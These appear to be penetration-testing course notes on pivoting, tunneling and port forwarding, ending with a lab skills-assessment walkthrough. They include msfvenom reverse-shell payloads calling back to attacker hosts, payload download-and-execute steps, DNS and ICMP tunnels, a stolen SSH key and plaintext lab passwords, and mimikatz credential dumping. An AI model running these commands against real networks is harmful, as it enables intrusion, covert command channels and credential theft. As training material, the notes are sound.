# Pivoting, Tunneling and Port Forwarding

1. [Introduction](#introduction)
1. [Starting Tunnels](#starting-tunnels)
1. [Socat](#socat)
1. [Pivoting](#pivoting)
1. [Advanced Tunnels](#advanced-tunnels)
1. [Double Pivots](#double-pivots)
1. [Skills Assessment](#skills-assessment)

## Introduction

* Pivoting - moving to other networks through a compromised host to find more targets on other network segments; part of lateral movement

* Tunneling - subset of pivoting; encapsulates network traffic into another protocol and routes traffic through it

* To get an idea of network configuration of any device, we can view IP addressing details via ```ipconfig``` (Windows) / ```ifconfig``` (Linux); and to view routing table - ```ip route``` (Windows) / ```netstat -r``` (Linux)

* Port forwarding - technique that allows to redirect communication request from one port to another; uses TCP as transport layer, but different protocols like SSH (application layer) or SOCKS (session layer) can be used to encapsulate forwarded traffic

* Local port forwarding - SSH can listen on our local port and forward a service on remote host to our port

* Dynamic port forwarding - sending packets to a remote network via a pivot host

* Remote/reverse port forwarding - forwarding a local service to remote port

## Starting Tunnels

* Dynamic port forwarding with SSH & SOCKS (Socket Secure) tunneling:

    * SSH local port forwarding:

        ```sh
        # attack host - 10.10.14.x
        # victim server - 10.129.x.x

        # scan pivot target
        nmap -sT -p- 10.129.202.64
        # this shows port 22 is open, and port 3306 is closed

        # to access MySQL service on victim server, we can either SSH into server and access it
        # or port forward it to our localhost on port 1234 and access locally - this is preferred in case of remote exploits

        ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
        # forwards all data we send via our port 1234 to victim server localhost:3306 (not our localhost)
        # we can use any unused port number in place of 1234

        # now we can access remote MySQL service locally on port 1234
        netstat -antp | grep 1234

        # check with nmap
        nmap -v -sV -p 1234 localhost

        # we can also forward multiple ports
        ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
        ```
    
    * Setting up pivot:

        ```sh
        # after SSHing into victim Ubuntu server
        ifconfig
        # this shows multiple NICs
        # one connected to our attack host
        # one communicating to other hosts in different network 172.16.5.0/23
        # and loopback interface

        # to scan the other network, we need to perform dynamic port forwarding
        # and pivot our network packets via victim server
        
        # this can be done by starting SOCKS listener on our localhost
        # and then configure SSH to forward that traffic via SSH to target network 172.16.5.0/23, after connecting to victim server
        # this is SSH tunneling over SOCKS proxy
        ```

        ```sh
        # enable dynamic port forwarding with SSH
        ssh -D 9050 ubuntu@10.129.202.64
        # SSH client is listening on localhost:9050
        # whatever data is sent here will be broadcasted to 172.16.5.0/23 over SSH
        ```

        ```sh
        # we can use proxychains tool - it can route any app packets over port 9050
        # it is capable of redirecting TCP connections through TOR, SOCKS, HTTP/HTTPS proxy servers

        # on attack host
        sudo vim /etc/proxychains.conf
        # modify config file
        # add 'socks4 127.0.0.1 9050' at end of file
        ```

        ```sh
        # now, we can use nmap with proxychains
        # so nmap packets will be routed to local port 9050, where SSH client is listening
        # which forwards all packets over SSH to 172.16.5.0/23
        proxychains nmap -v -sn 172.16.5.1-200
        # SOCKS tunneling technique
        
        # we can only perform full TCP connect scan over proxychains
        # this takes a lot of time, so we can scan smaller ranges

        proxychains nmap -v -Pn -sT 172.16.5.19
        # -Pn required especially for Windows target server
        # suppose we have port 3389 for RDP open (or filtered)
        ```

        ```sh
        # using metasploit with proxychains
        # to perform RDP scans
        proxychains msfconsole

        search rdp_scanner
        # use this module

        use 0
        set rhosts 172.16.5.19
        run
        # this gives us name and Windows OS version
        ```

        ```sh
        # we can use xfreerdp with proxychains
        # to log into victim Windows server over SOCKS tunnel
        proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
        ```

* Remote/Reverse port forwarding with SSH:

    ```sh
    # suppose we have pivoted into a Windows server via a pivot Ubuntu server
    # now, as the outgoing connection for Windows host is only limited to its internal network - 172.16.5.0/23
    # we cannot get a reverse shell directly, so we need to use the pivot host

    # on attack host
    # create Windows payload
    msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.19 -f exe -o backupscript.exe LPORT=8080
    # this port 8080 will be used on the Ubuntu server
    # which would be used to forward the reverse packets to port 8000 on attack host

    # start the Metasploit listener multi/handler
    msfconsole

    use exploit/multi/handler

    set payload windows/x64/meterpreter/reverse_https
    set lhost 0.0.0.0
    set lport 8000
    run

    # copy the payload to pivot host
    scp backupscript.exe ubuntu@10.129.202.64:~/
    ```

    ```sh
    # on Ubuntu server, host the payload
    python3 -m http.server 8123
    ```

    ```ps
    # on Windows target, download the payload from the Ubuntu target
    Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\Users\Public\backupscript.exe"
    ```

    ```sh
    # on attack host
    # we can use SSH remote port forwarding to forward connections from port 8080 on Ubuntu server, to our port 8000 listener
    ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
    # -vN for verbose, and to not prompt login shell
    # -R to listen on <IP>:8080, and forward all incoming connections to our listener on 0.0.0.0:8000

    # after this, we can execute the payload on Windows target
    # we can see the logs for requests from the pivot

    # our meterpreter session would also get established
    ```

* Meterpreter tunneling and port forwarding:

    ```sh
    # we can pivot using Meterpreter instead of SSH port forwarding if needed
    # we can create a Meterpreter shell for pivot Ubuntu server, to return a shell on attack host on port 8080

    # on attacker machine
    # create payload for Ubuntu pivot host
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

    # start multi/handler

    msfconsole -q

    use exploit/multi/handler

    set lhost 0.0.0.0
    set lport 8080
    set payload linux/x64/meterpreter/reverse_tcp
    run
    ```

    ```sh
    # copy the payload to the Ubuntu pivot host
    scp backupjob ubuntu@10.129.202.64:~/

    # then SSH into the Ubuntu pivot host
    ssh ubuntu@10.129.202.64

    ls
    # verify the payload exists

    chmod +x backupjob

    ./backupjob
    # this should establish the meterpreter session
    # check on attacker machine
    ```

    ```sh
    # on attacker machine
    # we can do a ping sweep in the meterpreter session
    # to generate ICMP traffic on 172.16.5.0/23 network - in which the Windows server is configured

    run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
    ```

    ```sh
    # if required, we can also do ping sweep
    # directly on target pivot host
    
    # for Linux pivot hosts
    for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    ```

    ```cmd
    # for Windows pivot hosts, over cmd
    for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
    ```

    ```ps
    # for Windows pivot hosts, over PS
    1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
    # ping sweeps can be attempted twice to ensure ARP cache is updated
    ```

    ```sh
    # on attacker machine, in the meterpreter session
    # if firewall blocks ICMP packets, we can do a TCP scan with nmap
    
    # we need to configure post-exploit module 'socks_proxy'
    # we can use SOCKS version 4a, and configure listener on port 9050 to route all traffic received via Meterpreter session
    
    background
    # background meterpreter shell

    use auxiliary/server/socks_proxy

    set SRVPORT 9050
    set SRVHOST 0.0.0.0
    set version 4a
    run
    # runs as background job in this case

    jobs
    # confirm proxy server is running

    # if needed, edit proxychains.conf to route traffic through pivot
    # add 'socks4   127.0.0.1 9050' to end of file if not done already
    sudo vim /etc/proxychains.conf

    # in meterpreter
    # add routes for 172.16.5.0/23 subnet to route proxychains traffic

    use post/multi/manage/autoroute

    set SESSION 1
    # meterpreter shell session
    set SUBNET 172.16.5.0
    run

    # alternatively, we can also add routes from the meterpreter shell itself
    run autoroute -s 172.16.5.0/23
    
    run autoroute -p
    # list active routes and check config
    ```

    ```sh
    # now on attacker machine
    # we can use proxychains to route nmap traffic via meterpreter session
    
    # in CLI, not in meterpreter shell
    proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
    ```

    ```sh
    # for port forwarding in meterpreter session
    help portfwd

    # create local TCP relay
    portfwd add -l 3300 -p 3389 -r 172.16.5.19
    # this starts a listener on attack host port 3300
    # and forwards all packets to remote Windows server port 3389 via meterpreter session

    # in CLI, we can connect to Windows server now
    xfreerdp /v:localhost:3300 /u:victor /p:pass@123

    # view info on established session
    netstat -antp
    ```

    ```sh
    # for reverse port forwarding in meterpreter session
    portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
    # forwards all connections on port 1234 on Ubuntu server
    # to the attack host on port 8081

    bg
    # background session

    # setup a listener for port 8081 for Windows shell
    set payload windows/x64/meterpreter/reverse_tcp
    set LPORT 8081
    set LHOST 0.0.0.0
    run

    # now, in CLI, create a Windows payload to send connection back to Ubuntu server
    # on 172.16.5.129:1234, so that it will forward it to attack host port 8081

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
    # where 172.16.5.129 is the IP for Ubuntu host, on the NIC connecting to Windows server

    # transfer and execute this payload on Windows host
    # then we will receive a shell on meterpreter from Windows, pivoted via Ubuntu server
    ```

## Socat

* ```socat``` - bidirectional relay tool, can create pipe sockets between 2 independent network channels without SSH tunneling

* socat redirection with reverse shell:

    ```sh
    ssh ubuntu@10.129.202.64
    
    # start socat listener on Ubuntu server
    socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
    # listen on localhost, port 8080
    # and forward all traffic to port 80 on attack machine 10.10.14.18
    ```

    ```sh
    # on attack host
    # create Windows payload, to connect back to the socat redirector
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
    # this payload needs to be transferred to the Windows server

    # then setup listener
    sudo msfconsole -q

    use exploit/multi/handler

    set payload windows/x64/meterpreter/reverse_https
    set lhost 0.0.0.0
    set lport 80
    run

    # now if we run the payload on Windows server
    # we will get a network connection from the redirector on Ubuntu server
    ```

* socat redirection with bind shell:

    ```sh
    # create windows payload
    msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
    ```

    ```sh
    # on Ubuntu server
    # start socat bind shell listener
    socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
    # this listens on port 8080, and forwards packets to Windows server port 8443
    ```

    ```sh
    # on attacker
    # setup Metasploit bind handler to connect to socat listener on Ubuntu server
    msfconsole -q

    use exploit/multi/handler

    set payload windows/x64/meterpreter/bind_tcp
    set RHOST 10.129.202.64
    set LPORT 8080
    run

    # after executing the payload on Windows target
    # we get a bind handler connected to stage request, pivoted via socat
    ```

## Pivoting

* ```plink```:

    ```cmd
    # CLI SSH tool for Windows

    # suppose we have a Windows attack host
    # we can set a dynamic port forward over Ubuntu server

    # starts SSH session to Ubuntu server, and plink listens on port 9050
    plink -ssh -D 9050 ubuntu@10.129.15.50

    # then we can use a Windows tool like Proxifier
    # to start a SOCKS tunnel via the above SSH session
    
    # so we can configure a SOCKS server for 127.0.0.1:9050 in Proxifier
    # and use 'mstsc.exe' for RDP session to Windows target server
    ```

* [sshuttle](https://github.com/sshuttle/sshuttle):

    ```sh
    # on attack machine, using sshuttle
    # -r to connect to Ubuntu server as pivot
    # and mention the network we want to route through the pivot host
    sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

    # sshuttle created an entry in our 'iptables' to redirect all traffic to 172.16.5.0/23 through pivot

    # we can then scan the Windows server, without proxychains
    nmap -v -sV -p3389 172.16.5.19 -A -Pn
    ```

* [rpivot](https://github.com/klsecservices/rpivot):

    ```sh
    # on attack machine
    # start rpivot SOCKS proxy server
    # to connect to client on Ubuntu server (pivot)
    python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

    # transfer rpivot to Ubuntu server
    scp -r rpivot ubuntu@10.129.202.64:/home/ubuntu/

    # run client.py from Ubuntu server
    python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

    # now we can configure proxychains to pivot over local server
    # on 127.0.0.1:9050 on attack host
    
    # then we can access the target web-server
    # hosted in internal network, at 172.16.5.135:80
    proxychains firefox-esr 172.16.5.135:80

    # rpivot also works with NTLM authentication proxy
    ```

* ```netsh```:

    ```cmd
    # port forward with netsh
    # on pivot Windows machine
    netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25

    # verify port forward
    netsh.exe interface portproxy show v4tov4

    # after this, we can connect to port 8080 of pivot host
    # from our attack host using xfreerdp
    xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
    ```

## Advanced Tunnels

* [dnscat2](https://github.com/iagox86/dnscat2):

    ```sh
    # setup dnscat2
    git clone https://github.com/iagox86/dnscat2.git

    cd dnscat2/server/

    sudo gem install bundler
    sudo bundle install
    ```

    ```sh
    # tool for DNS tunneling
    # start dnscat2 server
    sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
    # this provides a secret key to be used on dnscat2 client
    ```

    ```ps
    # on Windows client
    # we can use dnscat2-powershell - https://github.com/lukebaggett/dnscat2-powershell
    # transfer the .ps1 file to the Windows machine and import it
    Import-Module .\dnscat2.ps1

    # establish tunnel to server
    Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret-key> -Exec cmd
    # this creates an encrypted session on attack host

    # on attack host
    window -i 1
    # creates cmd session, to get shell
    ```

* [chisel](https://github.com/jpillora/chisel):

    * port forward:

        ```sh
        # setup chisel
        git clone https://github.com/jpillora/chisel.git

        cd chisel
        go build

        # once the binary is built, transfer binary to pivot Ubuntu server
        scp chisel ubuntu@10.129.202.64:~/
        ```

        ```sh
        # on pivot host, run the binary to start chisel server/listener
        ./chisel server -v -p 1234 --socks5
        # chisel listener will listen on port 1234 using SOCKS5
        # and forward it to all networks accessible from pivot server

        # if we get errors in running the binary, we can use older releases of chisel
        ```

        ```sh
        # on attack host, start chisel client to connect to server on pivot
        ./chisel client -v 10.129.202.64:1234 socks
        # creates TCP/UDP tunnel via HTTP, secured using SSH, and listens on port 1080

        # modify proxychains.conf and add 1080 port at end for socks5
        sudo vim /etc/proxychains.conf
        # if we are using socks5 config, comment out socks4 config

        # now we can use proxychains with RDP to connect to internal machine
        proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
        ```
    
    * reverse port forward:

        ```sh
        # start chisel server on attack host
        sudo ./chisel server --reverse -v -p 1234 --socks5

        # modify proxychains config to add port 1080 for socks5
        sudo vim /etc/proxychains.conf
        ```

        ```sh
        # connect from Ubuntu pivot to attack host
        ./chisel client -v 10.10.14.17:1234 R:socks

        # now we can use proxychains with any service on attack host
        ```

* [ptunnel-ng](https://github.com/utoni/ptunnel-ng):

    ```sh
    # ptunnel-ng tool can be used for ICMP tunneling
    # works when ping responses are permitted within firewalled network

    # setup
    git clone https://github.com/utoni/ptunnel-ng.git
    cd ptunnel-ng
    sudo ./autogen.sh

    # alternative approach to build static binary
    sudo apt install automake autoconf -y
    cd ptunnel-ng/
    sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
    ./autogen.sh
    ```

    ```sh
    # then, transfer the repo directory to pivot host
    scp -r ptunnel-ng ubuntu@10.129.202.64:~/

    # start ptunnel-ng server on pivot host
    ssh ubuntu@10.129.202.64

    sudo ptunnel-ng/src/ptunnel-ng -r10.129.202.64 -R22
    # -r to indicate IP for ptunnel-ng to accept connections on
    # -R for destination port
    ```

    ```sh
    # on attack host, connect to ptunnel-ng server using ptunnel-ng client
    sudo ptunnel-ng/src/ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
    # connecting through local port 2222
    ```

    ```sh
    # as the ICMP tunnel has been established
    # we can connect to pivot host using SSH through local port 2222
    ssh -p2222 -lubuntu 127.0.0.1
    ```

    ```sh
    # enable dynamic port forwarding over SSH
    ssh -D 9050 -p2222 -lubuntu 127.0.0.1

    # on attack host, proxychains through ICMP tunnel
    proxychains nmap -sV -sT 172.16.5.19 -p3389
    ```

## Double Pivots

* [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP):

    ```cmd
    # SocksOverRDP tool uses dynamic virtual channels from RDP for tunneling
    # useful in cases where we only have Windows pivot machines

    # transfer the binaries for SocksOverRDP and Proxifier from attack host to Windows pivot

    # connect to Windows pivot and load the DLL from the SocksOverRDP zip
    # in CMD/PS as admin
    regsvr32.exe SocksOverRDP-Plugin.dll

    # now we can connect to internal server 172.16.5.19 over RDP using mstsc.exe
    # and we will get a prompt that SocksOverRDP plugin is enabled
    # and it will listen on 127.0.0.1:1080 when server binary is executed

    # transfer SocksOverRDP-Server.exe to 172.16.5.19
    # and start it on the internal server with admin priv

    # back on pivot host
    netstat -antb | findstr 1080
    # this shows SOCKS listener on port 1080

    # we can use Proxifier portable on Windows pivot
    # navigate to proxy servers option
    # and add proxy server for 127.0.0.1:1080 with SOCKS5

    # if we start mstsc.exe, it will use Proxifier to pivot our traffic via port 1080, and tunnel it over RDP to internal server
    # this can be routed to another internal server using SocksOverRDP-server
    ```

## Skills Assessment

* We can access the first system via the given web shell and enumerate it:

    ```sh
    ls -la
    # check files

    ls -la /home
    # check user directories

    ls -la /home/webadmin
    # check files

    cat id_rsa
    # this can be private key for 'webadmin' user

    cat /home/webadmin/for-admin-eyes-only
    # this mentions username 'mlefay' and password 'Plain Human work!'

    ifconfig
    # this machine is dual-homed
    # connected to 10.129.x.x and 172.16.x.x networks
    ```

* We can try logging in as 'webadmin' using the ```id_rsa``` key from earlier:

    ```sh
    # on attack host
    vim id_rsa

    chmod 600 id_rsa

    ssh webadmin@10.129.229.129 -i id_rsa
    # SSH login works
    ```

* As the initial machine is dual-homed, we can use it as a pivot and check the 172.16.x.x internal network; we can use dynamic port forwarding method:

    ```sh
    # from attack host
    ssh -D 9050 webadmin@10.129.229.129 -i id_rsa
    # SSH client now listening on port 9050

    # we can do a ping sweep from pivot
    for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    ```

* The ping sweep shows 172.16.5.35 is up - we can setup ```proxychains``` and scan this machine:

    ```sh
    # on attack host, config proxychains
    sudo vim /etc/proxychains.conf
    # add 'socks4 127.0.0.1 9050' at end of file

    proxychains nmap -v -Pn -sT 172.16.5.35 -p 3389
    # RDP port scan
    # shows as 'filtered'

    # check if creds found earlier can be used here
    proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
    # RDP works
    ```

* We have a hint of user accounts, service accounts and exposed credentials; we can try using ```mimikatz``` here to check further:

    ```sh
    # we can transfer mimikatz.exe to pivot host
    scp -i id_rsa mimikatz.exe  webadmin@10.129.229.129:~/
    ```

    ```sh
    # on pivot host, we can host this file
    python3 -m http.server 8123
    ```

    ```ps
    # on Windows target, fetch mimikatz
    IWR http://172.16.5.15:8123/mimikatz.exe -OutFile mimikatz.exe

    .\mimikatz.exe
    # this has to be run in session as Administrator

    privilege::debug

    sekurlsa::logonpasswords
    # this dumps hashes
    # this also gives us a cleartext password "Imply wet Unmasked!" for user 'vfrank'
    ```

* Now that we have creds for 'vfrank' user, we can enumerate the machine further to see if there are any machines we can pivot to from here:

    ```ps
    # on Windows machine
    ipconfig
    # this shows it is connected to 2 different subnets with interfaces on 172.16.5.35 and 172.16.6.35

    # ping sweep on 172.16.6.x network
    1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
    # we can attempt this twice to ensure ARP cache is updated
    ```

* The ping sweep gives us live hosts 172.16.6.25 and 172.16.6.45 - we can try logging into one of these machines as 'vfrank' user:

    ```cmd
    mstsc.exe
    # use RDP client to connect

    # connect to 172.16.6.25 works
    # we can get the flag
    ```

* We can see there is an extra share at 'Z:' which mentions DC - clicking on it gives the final flag
